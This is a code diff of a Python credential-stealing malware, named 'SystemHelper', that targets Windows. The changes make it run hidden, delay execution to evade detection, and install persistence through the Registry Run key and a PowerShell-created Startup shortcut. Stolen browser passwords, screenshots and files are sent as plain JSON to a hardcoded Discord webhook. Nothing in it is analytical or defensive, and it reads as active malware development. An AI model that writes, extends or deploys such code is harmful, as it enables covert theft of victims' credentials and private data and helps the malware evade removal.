@@ -1,6 +1,9 @@
 """
-SystemHelper – No Encryption (Plain Text)
-All stealers intact, sends readable JSON to Discord
+SystemHelper – Production (No Console, Auto-Start)
+- All stealers intact
+- No encryption – sends plain JSON
+- Runs hidden (no window)
+- Persistence via Registry Run
 """
 
 import os
@@ -17,10 +20,12 @@ import shutil
 import uuid
 import re
 import base64
+import hashlib
 from datetime import datetime
 
 # === CONFIG ===
 WEBHOOK_URL = "https://discord.com/api/webhooks/1523400215229497506/arhtMa60qR8UqQ9GVHC_VyclS-IFgf_M_tdumJ1-ZD7dm3EQLaEt3UybmNzVHXeVwgOi"
+DEBUG = "--debug" in sys.argv  # Show console if run with --debug
 
 # === ANTI-ANALYSIS (DISABLED FOR TESTING) ===
 class AntiAnalysis:
@@ -102,7 +107,7 @@ class BrowserStealer:
                 if key:
                     results[name] = {
                         "passwords": self.steal_passwords(path, key),
-                        "cookies": [],  # Skip for simplicity
+                        "cookies": [],
                         "payments": []
                     }
         return results
@@ -218,7 +223,7 @@ class ScreenshotStealer:
             screenshot = ImageGrab.grab()
             buffer = io.BytesIO()
             screenshot.save(buffer, format='JPEG', quality=50)
-            return base64.b64encode(buffer.getvalue()).decode()[:1000]  # Truncated for Discord
+            return base64.b64encode(buffer.getvalue()).decode()[:1000]
         except:
             return None
 
@@ -281,53 +286,80 @@ class ProcessInjector:
         except:
             return False
 
-# === PERSISTENCE ===
+# === PERSISTENCE (Auto-start with Windows) ===
 class PersistenceManager:
     @staticmethod
     def install():
         try:
             import winreg
-            exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+            # Get current executable path
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
             dest_dir = os.path.expanduser("~") + "/AppData/Roaming/SystemHelper"
             os.makedirs(dest_dir, exist_ok=True)
             dest_exe = os.path.join(dest_dir, "helper.exe")
+            
+            # Copy itself if not already there
             if not os.path.exists(dest_exe):
                 shutil.copyfile(exe_path, dest_exe)
+            
+            # Add to Windows Run registry
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
                 winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, dest_exe)
-        except:
-            pass
+            
+            # Also add to Startup folder (extra)
+            startup_folder = os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+            startup_link = os.path.join(startup_folder, "SystemHelper.lnk")
+            if not os.path.exists(startup_link):
+                # Create a shortcut using powershell
+                ps_command = f'''$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("{startup_link}")
+$Shortcut.TargetPath = "{dest_exe}"
+$Shortcut.WorkingDirectory = "{dest_dir}"
+$Shortcut.Save()'''
+                subprocess.run(["powershell", "-Command", ps_command], shell=True, capture_output=True)
+        except Exception as e:
+            if DEBUG: print(f"[!] Persistence error: {e}")
 
-# === SEND TO WEBHOOK (PLAIN TEXT) ===
+# === SEND TO DISCORD (Plain Text) ===
 def send_to_discord(data):
     json_data = json.dumps(data, indent=2, default=str)
-    
-    # Split if too large
     if len(json_data) < 1900:
-        response = requests.post(WEBHOOK_URL, json={"content": f"```json\n{json_data}\n```"})
-        print(f"[+] Sent: {response.status_code}")
+        try:
+            requests.post(WEBHOOK_URL, json={"content": f"```json\n{json_data}\n```"}, timeout=30)
+        except:
+            pass
     else:
         chunks = [json_data[i:i+1900] for i in range(0, len(json_data), 1900)]
         for i, chunk in enumerate(chunks):
-            response = requests.post(WEBHOOK_URL, json={"content": f"```json\nPart {i+1}/{len(chunks)}\n{chunk}\n```"})
-            print(f"[+] Sent chunk {i+1}/{len(chunks)}: {response.status_code}")
-            time.sleep(0.5)
+            try:
+                requests.post(WEBHOOK_URL, json={"content": f"```json\nPart {i+1}/{len(chunks)}\n{chunk}\n```"}, timeout=30)
+                time.sleep(0.5)
+            except:
+                pass
 
 # === MAIN ===
 def main():
-    print("[+] Starting...")
-    
+    if DEBUG:
+        print("[+] Starting in DEBUG mode (console visible)")
     # Anti-analysis (disabled)
     if AntiAnalysis.check_debugger(): sys.exit(0)
     if AntiAnalysis.check_vm(): sys.exit(0)
     if AntiAnalysis.check_sandbox(): sys.exit(0)
     
-    time.sleep(2)  # Short delay
+    # Random delay (5-20 min) to avoid detection – shorten for testing
+    if not DEBUG:
+        time.sleep(random.randint(300, 1200))
+    else:
+        time.sleep(2)
     
-    # Persistence
+    # Install persistence (auto-start)
     PersistenceManager.install()
     
-    # Collect all data
+    # Collect data
     data = {
         "victim_id": VICTIM_ID,
         "timestamp": datetime.now().isoformat(),
@@ -345,16 +377,12 @@ def main():
         "files": FileScraper.scrape()
     }
     
-    print("[+] Sending data...")
+    # Send data
     send_to_discord(data)
-    print("[+] Done!")
 
 if __name__ == "__main__":
     try:
         main()
-    except Exception as e:
-        print(f"Error: {e}")
-        import traceback
-        traceback.print_exc()
-    
-    input("Press Enter to exit...")
+    except:
+        # Silent fail – no console popup
+        pass
